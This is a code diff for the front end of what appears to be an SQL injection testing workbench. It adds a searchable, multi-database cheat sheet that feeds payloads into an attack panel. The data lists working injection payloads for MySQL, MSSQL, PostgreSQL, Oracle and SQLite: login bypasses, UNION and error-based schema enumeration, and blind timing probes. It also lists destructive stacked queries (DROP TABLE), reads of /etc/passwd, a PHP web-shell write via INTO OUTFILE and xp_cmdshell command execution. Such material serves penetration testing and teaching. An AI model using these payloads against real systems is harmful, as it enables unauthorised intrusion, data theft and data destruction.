@@ -73,134 +73,537 @@
     const rawResponse = $('#rawResponse');
     const metaTableWrap = $('#metaTableWrap');
 
-    // ===== Enhanced Cheat Sheet (Multi-DB) =====
-    const CHEAT_SHEET = [
+    // ===== Enhanced Cheat Sheet (Multi-DB knowledge base) =====
+    // View model: home (pins + global search + DB list) → db (local search + functions) → detail overlay
+    const CHEAT_PINS_KEY = 'sqli-workbench-cheat-pins';
+    const cheatNav = { view: 'home', dbId: null, q: '', detailId: null };
+
+    const CHEAT_DBS = [
       {
-        title: 'Authentication Bypass',
+        id: 'generic',
+        name: 'Generic',
         tag: 'generic',
-        items: [
-          { p: "' OR '1'='1", db: '' },
-          { p: "' OR 1=1 -- -", db: '' },
-          { p: "' OR '1'='1' --", db: '' },
-          { p: "admin' --", db: '' },
-          { p: "admin' #", db: 'MySQL' },
-          { p: "' OR 1=1#", db: 'MySQL' },
-          { p: "') OR ('1'='1", db: '' },
-          { p: "' OR 'a'='a", db: '' },
-          { p: "1' OR '1'='1' /*", db: '' },
+        blurb: 'DB-agnostic auth bypass, boolean probes, stacked basics',
+        categories: [
+          {
+            title: 'Authentication Bypass',
+            items: [
+              { id: 'gen-or-1', name: "' OR '1'='1", summary: 'Classic string OR true', description: 'Closes a string context and forces the WHERE clause to evaluate true for all rows. Works on many string-based login filters.', example: "username = admin' OR '1'='1' -- & password = x", payloads: ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*"], tags: ['auth', 'bypass'] },
+              { id: 'gen-or-num', name: "' OR 1=1 --", summary: 'Numeric-style true condition', description: 'Boolean true via 1=1. Prefer comment style matching the backend (space+--, #, /*).', example: "id=1' OR 1=1-- -", payloads: ["' OR 1=1-- -", "' OR 1=1#", "') OR (1=1)-- -"], tags: ['auth', 'bypass'] },
+              { id: 'gen-admin-comment', name: "admin' --", summary: 'Close user + comment out password check', description: 'Injects username admin and comments the rest of the SQL so the password predicate is ignored (if query is built by concatenation).', example: "user=admin' --&pass=anything", payloads: ["admin' --", "admin' #", "admin'/*"], tags: ['auth'] },
+              { id: 'gen-or-char', name: "' OR 'a'='a", summary: 'Char equality true', description: 'Same idea as 1=1 using character comparison — useful when numeric forms are filtered.', example: "' OR 'a'='a' --", payloads: ["' OR 'a'='a", "' OR 'a'='a'-- -"], tags: ['auth', 'bypass'] },
+            ],
+          },
+          {
+            title: 'Boolean probes',
+            items: [
+              { id: 'gen-true', name: 'AND 1=1', summary: 'Baseline true', description: 'Should keep page behavior similar to a normal valid condition — use as baseline before 1=2.', example: "AND 1=1-- -", payloads: ["AND 1=1-- -", "AND 'a'='a'-- -"], tags: ['boolean'] },
+              { id: 'gen-false', name: 'AND 1=2', summary: 'Baseline false', description: 'Should change content/length vs 1=1 if the injection point is evaluated.', example: "AND 1=2-- -", payloads: ["AND 1=2-- -", "AND 'a'='b'-- -"], tags: ['boolean'] },
+            ],
+          },
+          {
+            title: 'Stacked / destructive samples',
+            items: [
+              { id: 'gen-stack-drop', name: '; DROP TABLE …', summary: 'Stacked destructive (lab only)', description: 'Only works if stacked queries are allowed. Never run against systems you do not own.', example: "; DROP TABLE users--", payloads: ["; DROP TABLE users--", "; INSERT INTO users VALUES('hacker','pass')--"], tags: ['stacked', 'lab'] },
+            ],
+          },
         ],
       },
       {
-        title: 'UNION — MySQL',
+        id: 'mysql',
+        name: 'MySQL',
         tag: 'mysql',
-        items: [
-          { p: "ORDER BY 1-- -", db: 'MySQL' },
-          { p: "ORDER BY 10-- -", db: 'MySQL' },
-          { p: "UNION SELECT NULL-- -", db: 'MySQL' },
-          { p: "UNION SELECT 1,2,3-- -", db: 'MySQL' },
-          { p: "UNION SELECT 1,2,database()-- -", db: 'MySQL' },
-          { p: "UNION SELECT 1,2,version()-- -", db: 'MySQL' },
-          { p: "UNION SELECT 1,table_name,3 FROM information_schema.tables-- -", db: 'MySQL' },
-          { p: "UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -", db: 'MySQL' },
-          { p: "UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -", db: 'MySQL' },
+        blurb: 'version/database, information_schema, SLEEP, EXTRACTVALUE, GROUP_CONCAT',
+        categories: [
+          {
+            title: 'Info & identity',
+            items: [
+              { id: 'my-version', name: 'version() / @@version', summary: 'Server version', description: 'Returns MySQL version string. Useful early fingerprint after confirming SQLi.', example: "SELECT version();", payloads: ["UNION SELECT 1,version(),3-- -", "UNION SELECT 1,@@version,3-- -", "AND EXTRACTVALUE(1,CONCAT(0x7e,version()))"], tags: ['info', 'enum'] },
+              { id: 'my-database', name: 'database()', summary: 'Current schema name', description: 'Name of the default database for the connection.', example: "SELECT database();", payloads: ["UNION SELECT 1,database(),3-- -", "AND LENGTH(database())>1-- -"], tags: ['info', 'enum'] },
+              { id: 'my-user', name: 'user() / current_user()', summary: 'DB user', description: 'user() may include client host; current_user() is the authenticated account.', example: "SELECT user(), current_user();", payloads: ["UNION SELECT 1,user(),3-- -", "UNION SELECT 1,current_user(),3-- -"], tags: ['info'] },
+              { id: 'my-schema', name: 'schema()', summary: 'Alias of database()', description: 'Synonym for database() in MySQL.', example: "SELECT schema();", payloads: ["UNION SELECT 1,schema(),3-- -"], tags: ['info'] },
+            ],
+          },
+          {
+            title: 'String & helpers',
+            items: [
+              { id: 'my-concat', name: 'CONCAT / CONCAT_WS', summary: 'Join strings', description: 'CONCAT returns NULL if any arg is NULL; CONCAT_WS skips NULL separators.', example: "CONCAT(user(),0x3a,database())", payloads: ["UNION SELECT 1,CONCAT(user(),0x3a,database()),3-- -", "UNION SELECT 1,CONCAT_WS(0x3a,user(),database()),3-- -"], tags: ['string'] },
+              { id: 'my-group-concat', name: 'GROUP_CONCAT', summary: 'Aggregate many rows to one cell', description: 'Critical for UNION when you need multiple table/column names in one column. Raise group_concat_max_len if truncated.', example: "GROUP_CONCAT(table_name SEPARATOR ',')", payloads: ["UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -", "UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -"], tags: ['enum', 'string'] },
+              { id: 'my-substr', name: 'SUBSTRING / SUBSTR / MID', summary: 'Slice strings (blind)', description: 'Extract one character at a time for boolean/time blind extraction.', example: "SUBSTRING(database(),1,1)='a'", payloads: ["AND SUBSTRING(database(),1,1)='a'-- -", "AND MID(VERSION(),1,1)='5'-- -"], tags: ['blind', 'string'] },
+              { id: 'my-ascii', name: 'ASCII / ORD', summary: 'Char code for binary search', description: 'Combine with SUBSTRING for efficient blind extraction via binary search on ASCII codes.', example: "ASCII(SUBSTRING(database(),1,1))>97", payloads: ["AND ASCII(SUBSTRING(database(),1,1))>97-- -"], tags: ['blind'] },
+              { id: 'my-length', name: 'LENGTH / CHAR_LENGTH', summary: 'String length', description: 'LENGTH is bytes; CHAR_LENGTH is characters — differ for multi-byte sets.', example: "LENGTH(database())", payloads: ["AND LENGTH(database())>3-- -"], tags: ['blind'] },
+              { id: 'my-if', name: 'IF(cond,a,b)', summary: 'Inline conditional', description: 'Handy for time-based: sleep only when condition is true.', example: "IF(1=1,SLEEP(5),0)", payloads: ["AND IF(1=1,SLEEP(5),0)-- -", "AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)-- -"], tags: ['time', 'logic'] },
+            ],
+          },
+          {
+            title: 'Schema enumeration',
+            items: [
+              { id: 'my-tables', name: 'information_schema.tables', summary: 'List tables', description: 'Filter table_schema=database() for current DB tables.', example: "SELECT table_name FROM information_schema.tables WHERE table_schema=database()", payloads: ["UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -", "UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"], tags: ['enum'] },
+              { id: 'my-columns', name: 'information_schema.columns', summary: 'List columns', description: 'Enumerate columns for a known table_name.', example: "SELECT column_name FROM information_schema.columns WHERE table_name='users'", payloads: ["UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -", "UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -"], tags: ['enum'] },
+              { id: 'my-schemata', name: 'information_schema.schemata', summary: 'List databases', description: 'All schemas visible to the current user.', example: "SELECT schema_name FROM information_schema.schemata", payloads: ["UNION SELECT 1,schema_name,3 FROM information_schema.schemata-- -"], tags: ['enum'] },
+            ],
+          },
+          {
+            title: 'UNION / ORDER BY',
+            items: [
+              { id: 'my-orderby', name: 'ORDER BY n', summary: 'Find column count', description: 'Increase n until error — last success is column count.', example: "ORDER BY 1-- - … ORDER BY 10-- -", payloads: ["ORDER BY 1-- -", "ORDER BY 5-- -", "ORDER BY 10-- -"], tags: ['union'] },
+              { id: 'my-union', name: 'UNION SELECT', summary: 'Stack result sets', description: 'Match column count; use NULL or integers then replace reflection columns with functions.', example: "UNION SELECT 1,2,3-- -", payloads: ["UNION SELECT NULL-- -", "UNION SELECT 1,2,3-- -", "UNION SELECT 1,2,database()-- -"], tags: ['union'] },
+            ],
+          },
+          {
+            title: 'Error-based',
+            items: [
+              { id: 'my-extractvalue', name: 'EXTRACTVALUE', summary: 'XPath error leak', description: 'Forces XPath error embedding query result in the message (when errors displayed).', example: "EXTRACTVALUE(1, CONCAT(0x7e,(SELECT version()),0x7e))", payloads: ["AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))", "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))"], tags: ['error'] },
+              { id: 'my-updatexml', name: 'UPDATEXML', summary: 'XML error leak', description: 'Similar to EXTRACTVALUE via UPDATEXML error channel.', example: "UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)", payloads: ["AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)"], tags: ['error'] },
+              { id: 'my-dup-error', name: 'FLOOR rand error', summary: 'Duplicate key error leak', description: 'Classic COUNT/FLOOR(RAND(0)*2) double-query error technique.', example: "(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)", payloads: ["AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"], tags: ['error'] },
+            ],
+          },
+          {
+            title: 'Time-based blind',
+            items: [
+              { id: 'my-sleep', name: 'SLEEP(n)', summary: 'Delay n seconds', description: 'Primary time sink. Measure RTT delta vs baseline.', example: "SLEEP(5)", payloads: ["AND SLEEP(5)-- -", "AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -", "; SELECT SLEEP(5)-- -"], tags: ['time'] },
+              { id: 'my-benchmark', name: 'BENCHMARK', summary: 'CPU burn delay', description: 'Alternative when SLEEP is filtered; noisier on CPU.', example: "BENCHMARK(10000000,SHA1('test'))", payloads: ["AND BENCHMARK(10000000,SHA1('a'))-- -"], tags: ['time'] },
+            ],
+          },
+          {
+            title: 'File / dangerous (lab)',
+            items: [
+              { id: 'my-load-file', name: 'LOAD_FILE', summary: 'Read server file', description: 'Requires FILE privilege and secure_file_priv constraints.', example: "LOAD_FILE('/etc/passwd')", payloads: ["UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -"], tags: ['file', 'lab'] },
+              { id: 'my-into-outfile', name: 'INTO OUTFILE', summary: 'Write web shell (lab)', description: 'Needs FILE privilege + writable path. Lab-only technique.', example: "SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/s.php'", payloads: ["' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/tmp/shell.php'-- -"], tags: ['file', 'lab'] },
+            ],
+          },
         ],
       },
       {
-        title: 'UNION — MSSQL',
+        id: 'mssql',
+        name: 'MSSQL',
         tag: 'mssql',
-        items: [
-          { p: "ORDER BY 1--", db: 'MSSQL' },
-          { p: "UNION SELECT NULL--", db: 'MSSQL' },
-          { p: "UNION SELECT 1,2,3--", db: 'MSSQL' },
-          { p: "UNION SELECT 1,@@version,3--", db: 'MSSQL' },
-          { p: "UNION SELECT 1,db_name(),3--", db: 'MSSQL' },
-          { p: "UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--", db: 'MSSQL' },
-          { p: "UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--", db: 'MSSQL' },
+        blurb: '@@version, db_name, sysobjects, WAITFOR, CONVERT errors',
+        categories: [
+          {
+            title: 'Info & identity',
+            items: [
+              { id: 'ms-version', name: '@@version', summary: 'SQL Server version banner', description: 'Long banner with build and OS hints.', example: "SELECT @@version", payloads: ["UNION SELECT 1,@@version,3--", "AND 1=CONVERT(int,@@version)--"], tags: ['info'] },
+              { id: 'ms-db', name: 'db_name() / DB_NAME()', summary: 'Current database', description: 'Name of the active database.', example: "SELECT db_name()", payloads: ["UNION SELECT 1,db_name(),3--"], tags: ['info'] },
+              { id: 'ms-user', name: 'system_user / user_name()', summary: 'Login / user', description: 'system_user is login; user_name() is database user.', example: "SELECT system_user, user_name()", payloads: ["UNION SELECT 1,system_user,3--", "UNION SELECT 1,user_name(),3--"], tags: ['info'] },
+              { id: 'ms-servername', name: '@@servername', summary: 'Instance name', description: 'SQL Server instance network name.', example: "SELECT @@servername", payloads: ["UNION SELECT 1,@@servername,3--"], tags: ['info'] },
+            ],
+          },
+          {
+            title: 'Schema enumeration',
+            items: [
+              { id: 'ms-tables', name: 'sysobjects / sys.tables', summary: 'List user tables', description: "xtype='U' filters user tables in older catalog views.", example: "SELECT name FROM sysobjects WHERE xtype='U'", payloads: ["UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--", "UNION SELECT 1,name,3 FROM sys.tables--"], tags: ['enum'] },
+              { id: 'ms-columns', name: 'syscolumns / information_schema', summary: 'List columns', description: 'Resolve table id then column names, or use information_schema.columns.', example: "SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')", payloads: ["UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--", "UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--"], tags: ['enum'] },
+            ],
+          },
+          {
+            title: 'UNION / TOP',
+            items: [
+              { id: 'ms-orderby', name: 'ORDER BY n', summary: 'Column count', description: 'Same methodology as other engines; comment with --', example: "ORDER BY 1--", payloads: ["ORDER BY 1--", "ORDER BY 10--"], tags: ['union'] },
+              { id: 'ms-union', name: 'UNION SELECT', summary: 'Union injection', description: 'Match types/count; MSSQL often needs same types across arms.', example: "UNION SELECT 1,2,3--", payloads: ["UNION SELECT NULL--", "UNION SELECT 1,2,3--", "UNION SELECT 1,@@version,3--"], tags: ['union'] },
+            ],
+          },
+          {
+            title: 'Error / time / stacked',
+            items: [
+              { id: 'ms-convert', name: 'CONVERT / CAST errors', summary: 'Type conversion leak', description: 'Force conversion of a subquery string to int to surface data in error.', example: "CONVERT(int,(SELECT @@version))", payloads: ["' AND 1=CONVERT(int,(SELECT @@version))--", "AND 1=CAST((SELECT db_name()) AS int)--"], tags: ['error'] },
+              { id: 'ms-waitfor', name: "WAITFOR DELAY", summary: 'Time delay', description: "Standard MSSQL time-based sink.", example: "WAITFOR DELAY '0:0:5'", payloads: ["AND WAITFOR DELAY '0:0:5'--", "; WAITFOR DELAY '0:0:5'--"], tags: ['time'] },
+              { id: 'ms-stacked', name: 'Stacked queries', summary: 'Multiple statements', description: 'MSSQL frequently allows stacked queries depending on driver (e.g. some PHP/Python stacks).', example: "; WAITFOR DELAY '0:0:5'--", payloads: ["; WAITFOR DELAY '0:0:5'--", "; SELECT 1--"], tags: ['stacked'] },
+            ],
+          },
+          {
+            title: 'xp_cmdshell (lab)',
+            items: [
+              { id: 'ms-xpcmd', name: 'xp_cmdshell', summary: 'OS command (if enabled)', description: 'Requires sysadmin and xp_cmdshell enabled. Lab-only.', example: "EXEC xp_cmdshell 'whoami'", payloads: ["; EXEC xp_cmdshell 'whoami'--"], tags: ['os', 'lab'] },
+            ],
+          },
         ],
       },
       {
-        title: 'UNION — PostgreSQL',
+        id: 'pgsql',
+        name: 'PostgreSQL',
         tag: 'pgsql',
-        items: [
-          { p: "ORDER BY 1-- -", db: 'PgSQL' },
-          { p: "UNION SELECT NULL-- -", db: 'PgSQL' },
-          { p: "UNION SELECT 1,2,3-- -", db: 'PgSQL' },
-          { p: "UNION SELECT 1,version(),3-- -", db: 'PgSQL' },
-          { p: "UNION SELECT 1,current_database(),3-- -", db: 'PgSQL' },
-          { p: "UNION SELECT 1,tablename,3 FROM pg_tables-- -", db: 'PgSQL' },
-          { p: "UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -", db: 'PgSQL' },
+        blurb: 'version(), current_database, pg_sleep, information_schema, UDF notes',
+        categories: [
+          {
+            title: 'Info & identity',
+            items: [
+              { id: 'pg-version', name: 'version()', summary: 'PostgreSQL version', description: 'Full version string of the server.', example: "SELECT version();", payloads: ["UNION SELECT 1,version(),3-- -", "AND 1=CAST(version() AS int)-- -"], tags: ['info'] },
+              { id: 'pg-db', name: 'current_database()', summary: 'Current DB', description: 'Name of the database in use.', example: "SELECT current_database();", payloads: ["UNION SELECT 1,current_database(),3-- -"], tags: ['info'] },
+              { id: 'pg-user', name: 'current_user / user / session_user', summary: 'Role names', description: 'current_user is active role; session_user is session login role.', example: "SELECT current_user, session_user;", payloads: ["UNION SELECT 1,current_user,3-- -", "UNION SELECT 1,session_user,3-- -"], tags: ['info'] },
+            ],
+          },
+          {
+            title: 'String / blind helpers',
+            items: [
+              { id: 'pg-substr', name: 'SUBSTR / SUBSTRING', summary: 'Slice for blind', description: '1-based indexing for character extraction.', example: "SUBSTR(version(),1,1)='P'", payloads: ["AND SUBSTR((SELECT version()),1,1)='P'-- -", "AND SUBSTRING(current_database(),1,1)='a'-- -"], tags: ['blind', 'string'] },
+              { id: 'pg-length', name: 'LENGTH', summary: 'String length', description: 'Character length of text.', example: "LENGTH(current_database())", payloads: ["AND LENGTH(current_database())>1-- -"], tags: ['blind'] },
+              { id: 'pg-ascii', name: 'ASCII', summary: 'Codepoint', description: 'ASCII code of first character of string.', example: "ASCII(SUBSTR(current_database(),1,1))", payloads: ["AND ASCII(SUBSTR(current_database(),1,1))>97-- -"], tags: ['blind'] },
+            ],
+          },
+          {
+            title: 'Schema enumeration',
+            items: [
+              { id: 'pg-tables', name: 'pg_tables / information_schema', summary: 'List tables', description: 'pg_tables is concise; information_schema is portable.', example: "SELECT tablename FROM pg_tables WHERE schemaname='public'", payloads: ["UNION SELECT 1,tablename,3 FROM pg_tables-- -", "UNION SELECT 1,table_name,3 FROM information_schema.tables-- -"], tags: ['enum'] },
+              { id: 'pg-columns', name: 'information_schema.columns', summary: 'List columns', description: 'Filter by table_name for target table.', example: "SELECT column_name FROM information_schema.columns WHERE table_name='users'", payloads: ["UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -"], tags: ['enum'] },
+            ],
+          },
+          {
+            title: 'UNION / time / error',
+            items: [
+              { id: 'pg-union', name: 'UNION SELECT', summary: 'Union injection', description: 'Match column count; types must align or cast explicitly.', example: "UNION SELECT 1,2,3-- -", payloads: ["ORDER BY 1-- -", "UNION SELECT NULL-- -", "UNION SELECT 1,version(),3-- -"], tags: ['union'] },
+              { id: 'pg-sleep', name: 'pg_sleep', summary: 'Time delay', description: 'Primary time-based function in PostgreSQL.', example: "SELECT pg_sleep(5);", payloads: ["AND pg_sleep(5)-- -", "AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)-- -"], tags: ['time'] },
+              { id: 'pg-cast', name: 'CAST errors', summary: 'Error-based leak', description: 'Cast a string query result to int to trigger verbose errors when shown.', example: "CAST((SELECT version()) AS int)", payloads: ["AND 1=CAST((SELECT version()) AS int)-- -"], tags: ['error'] },
+            ],
+          },
         ],
       },
       {
-        title: 'UNION — Oracle',
+        id: 'oracle',
+        name: 'Oracle',
         tag: 'oracle',
-        items: [
-          { p: "ORDER BY 1--", db: 'Oracle' },
-          { p: "UNION SELECT NULL FROM dual--", db: 'Oracle' },
-          { p: "UNION SELECT 1,2,3 FROM dual--", db: 'Oracle' },
-          { p: "UNION SELECT 1,banner,3 FROM v$version--", db: 'Oracle' },
-          { p: "UNION SELECT 1,table_name,3 FROM all_tables--", db: 'Oracle' },
-          { p: "UNION SELECT 1,column_name,3 FROM all_tab_columns WHERE table_name='USERS'--", db: 'Oracle' },
+        blurb: 'dual, v$version, all_tables, DBMS_PIPE, SUBSTR',
+        categories: [
+          {
+            title: 'Info & dual',
+            items: [
+              { id: 'or-dual', name: 'FROM dual', summary: 'Dummy table required', description: 'Many Oracle SELECTs need FROM dual when no real table is referenced.', example: "SELECT 1 FROM dual", payloads: ["UNION SELECT NULL FROM dual--", "UNION SELECT 1,2,3 FROM dual--"], tags: ['union', 'info'] },
+              { id: 'or-version', name: 'v$version / banner', summary: 'Version banner', description: 'Query v$version for product banner lines.', example: "SELECT banner FROM v$version", payloads: ["UNION SELECT 1,banner,3 FROM v$version--"], tags: ['info'] },
+              { id: 'or-user', name: 'USER', summary: 'Current schema user', description: 'Returns the name of the session user.', example: "SELECT USER FROM dual", payloads: ["UNION SELECT 1,USER,3 FROM dual--"], tags: ['info'] },
+            ],
+          },
+          {
+            title: 'Schema enumeration',
+            items: [
+              { id: 'or-tables', name: 'all_tables / user_tables', summary: 'List tables', description: 'all_tables includes accessible tables; user_tables is owned tables.', example: "SELECT table_name FROM all_tables", payloads: ["UNION SELECT 1,table_name,3 FROM all_tables--", "UNION SELECT 1,table_name,3 FROM user_tables--"], tags: ['enum'] },
+              { id: 'or-columns', name: 'all_tab_columns', summary: 'List columns', description: 'Oracle often stores table names uppercase unless quoted identifiers.', example: "SELECT column_name FROM all_tab_columns WHERE table_name='USERS'", payloads: ["UNION SELECT 1,column_name,3 FROM all_tab_columns WHERE table_name='USERS'--"], tags: ['enum'] },
+            ],
+          },
+          {
+            title: 'String / time',
+            items: [
+              { id: 'or-substr', name: 'SUBSTR', summary: 'Blind extraction', description: 'Character extraction for boolean blind.', example: "SUBSTR(USER,1,1)='S'", payloads: ["AND SUBSTR(USER,1,1)='S'--"], tags: ['blind', 'string'] },
+              { id: 'or-pipe', name: 'DBMS_PIPE.RECEIVE_MESSAGE', summary: 'Time delay', description: 'Common Oracle time-based technique via pipe wait.', example: "DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)", payloads: ["AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--"], tags: ['time'] },
+            ],
+          },
         ],
       },
       {
-        title: 'Error-Based',
-        tag: 'mysql',
-        items: [
-          { p: "AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))", db: 'MySQL' },
-          { p: "AND UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)", db: 'MySQL' },
-          { p: "AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)", db: 'MySQL' },
-          { p: "' AND 1=CONVERT(int, (SELECT @@version))--", db: 'MSSQL' },
-          { p: "AND 1=CAST((SELECT version()) AS int)--", db: 'PgSQL' },
-        ],
-      },
-      {
-        title: 'Time-Based Blind',
-        tag: 'generic',
-        items: [
-          { p: "AND SLEEP(5)-- -", db: 'MySQL' },
-          { p: "AND IF(1=1, SLEEP(5), 0)-- -", db: 'MySQL' },
-          { p: "AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -", db: 'MySQL' },
-          { p: "; WAITFOR DELAY '0:0:5'--", db: 'MSSQL' },
-          { p: "AND WAITFOR DELAY '0:0:5'--", db: 'MSSQL' },
-          { p: "AND pg_sleep(5)-- -", db: 'PgSQL' },
-          { p: "AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)-- -", db: 'PgSQL' },
-          { p: "AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--", db: 'Oracle' },
-        ],
-      },
-      {
-        title: 'Boolean Blind',
-        tag: 'generic',
-        items: [
-          { p: "AND 1=1-- -", db: '' },
-          { p: "AND 1=2-- -", db: '' },
-          { p: "AND SUBSTRING(database(),1,1)='a'-- -", db: 'MySQL' },
-          { p: "AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -", db: 'MySQL' },
-          { p: "AND LENGTH(database())>5-- -", db: 'MySQL' },
-          { p: "AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1))>64--", db: 'MSSQL' },
-          { p: "AND SUBSTR((SELECT version()),1,1)='P'-- -", db: 'PgSQL' },
-        ],
-      },
-      {
-        title: 'Stacked Queries',
-        tag: 'generic',
-        items: [
-          { p: "; SELECT SLEEP(5)-- -", db: 'MySQL' },
-          { p: "; WAITFOR DELAY '0:0:5'--", db: 'MSSQL' },
-          { p: "; DROP TABLE users--", db: '' },
-          { p: "; INSERT INTO users VALUES('hacker','pass')--", db: '' },
-        ],
-      },
-      {
-        title: 'SQLite Specific',
+        id: 'sqlite',
+        name: 'SQLite',
         tag: 'sqlite',
-        items: [
-          { p: "' UNION SELECT 1,2,3--", db: 'SQLite' },
-          { p: "' UNION SELECT sql,2,3 FROM sqlite_master--", db: 'SQLite' },
-          { p: "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--", db: 'SQLite' },
+        blurb: 'sqlite_master, sql schema, RANDOMBLOB delay tricks',
+        categories: [
+          {
+            title: 'Catalog',
+            items: [
+              { id: 'sq-master', name: 'sqlite_master', summary: 'Schema catalog', description: 'Tables, views, and the SQL used to create them.', example: "SELECT sql FROM sqlite_master WHERE type='table'", payloads: ["' UNION SELECT sql,2,3 FROM sqlite_master--", "' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table'--"], tags: ['enum'] },
+              { id: 'sq-union', name: 'UNION SELECT', summary: 'Union basics', description: 'Match column count; SQLite is flexible with types.', example: "' UNION SELECT 1,2,3--", payloads: ["' UNION SELECT 1,2,3--", "' UNION SELECT sql,2,3 FROM sqlite_master--"], tags: ['union'] },
+            ],
+          },
+          {
+            title: 'Time-ish / heavy',
+            items: [
+              { id: 'sq-randomblob', name: 'RANDOMBLOB heavy LIKE', summary: 'CPU/time approximation', description: 'Abuses large blob generation + LIKE for delay when no SLEEP exists.', example: "LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))", payloads: ["' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--"], tags: ['time'] },
+            ],
+          },
         ],
       },
     ];
+
+    function loadCheatPins() {
+      try {
+        const raw = localStorage.getItem(CHEAT_PINS_KEY);
+        const arr = raw ? JSON.parse(raw) : [];
+        return Array.isArray(arr) ? arr : [];
+      } catch { return []; }
+    }
+    function saveCheatPins(ids) {
+      try { localStorage.setItem(CHEAT_PINS_KEY, JSON.stringify(ids || [])); } catch {}
+    }
+    function isCheatPinned(id) {
+      return loadCheatPins().includes(id);
+    }
+    function toggleCheatPin(id) {
+      const pins = loadCheatPins();
+      const i = pins.indexOf(id);
+      if (i >= 0) pins.splice(i, 1);
+      else pins.unshift(id);
+      saveCheatPins(pins);
+      return pins.includes(id);
+    }
+
+    function findCheatItem(id) {
+      for (const db of CHEAT_DBS) {
+        for (const cat of db.categories) {
+          for (const item of cat.items) {
+            if (item.id === id) return { db, cat, item };
+          }
+        }
+      }
+      return null;
+    }
+
+    function allCheatItems() {
+      const out = [];
+      for (const db of CHEAT_DBS) {
+        for (const cat of db.categories) {
+          for (const item of cat.items) {
+            out.push({ db, cat, item });
+          }
+        }
+      }
+      return out;
+    }
+
+    function cheatMatchesQuery(ref, q) {
+      if (!q) return true;
+      const blob = [
+        ref.item.name, ref.item.summary, ref.item.description || '',
+        ref.item.example || '', (ref.item.payloads || []).join(' '),
+        (ref.item.tags || []).join(' '), ref.cat.title, ref.db.name,
+      ].join(' ').toLowerCase();
+      return q.toLowerCase().split(/\s+/).filter(Boolean).every((w) => blob.includes(w));
+    }
+
+    // ===== Cheat Sheet (multi-view) =====
+    function insertCheatPayload(text) {
+      if (!payloadInput) return;
+      const cur = payloadInput.value || '';
+      payloadInput.value = cur && !cur.endsWith('\n') ? (cur + '\n' + text) : (cur + text);
+      if (typeof updatePayloadSummary === 'function') updatePayloadSummary();
+      if (typeof refreshAttackPanel === 'function') refreshAttackPanel();
+      openVPanel('payload');
+      showToast('Payload inserted', 'success');
+    }
+
+    function renderCheatSheet() {
+      if (!cheatSheetBody) return;
+      // default to home each explicit open unless we only re-render detail
+      if (!cheatNav._ready) {
+        cheatNav.view = 'home';
+        cheatNav.dbId = null;
+        cheatNav.q = '';
+        cheatNav.detailId = null;
+        cheatNav._ready = true;
+      }
+      paintCheatSheet();
+    }
+
+    function paintCheatSheet() {
+      if (!cheatSheetBody) return;
+      if (cheatNav.view === 'db' && cheatNav.dbId) paintCheatDbView();
+      else paintCheatHomeView();
+      if (cheatNav.detailId) paintCheatDetail(cheatNav.detailId);
+      else {
+        const ov = $('#cheatDetailOverlay');
+        if (ov) ov.classList.add('hidden');
+      }
+    }
+
+    function paintCheatHomeView() {
+      const pins = loadCheatPins();
+      const pinnedRefs = pins.map(findCheatItem).filter(Boolean);
+      const q = cheatNav.q || '';
+      const globalHits = q ? allCheatItems().filter((r) => cheatMatchesQuery(r, q)).slice(0, 80) : [];
+
+      cheatSheetBody.innerHTML = `
+        <div class="cheat-view cheat-home">
+          <div class="cheat-search-row">
